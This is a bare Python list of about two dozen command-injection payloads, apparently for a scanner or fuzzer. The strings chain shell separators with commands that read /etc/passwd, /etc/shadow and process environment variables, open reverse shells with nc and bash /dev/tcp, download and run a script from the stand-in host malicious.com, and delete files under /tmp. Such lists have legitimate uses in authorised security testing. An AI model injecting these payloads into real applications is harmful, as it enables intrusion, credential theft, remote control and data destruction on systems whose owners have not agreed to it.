cmdi_payloads = [
    ";id", "&& whoami", "| uname -a", "| netstat -an", "| cat /etc/passwd",
    "|| whoami", "; ls", "| ps aux", "; echo test", "&& id", "| ifconfig", 
    "; cat /etc/hostname", "| cat /proc/self/environ", "; ping -c 1 127.0.0.1", 
    "&& cat /etc/shadow", "| nc -v -w 3 127.0.0.1 4444", "; nc -e /bin/sh 127.0.0.1 4444", 
    "| /bin/bash -i", "; wget http://malicious.com/malware.sh -O /tmp/malware.sh; sh /tmp/malware.sh",
    "&& curl http://malicious.com/malware.sh | sh", "; echo -n > /tmp/test", 
    "&& bash -i >& /dev/tcp/127.0.0.1/4444 0>&1", "; rm -rf /tmp/*", "| dmesg"
]
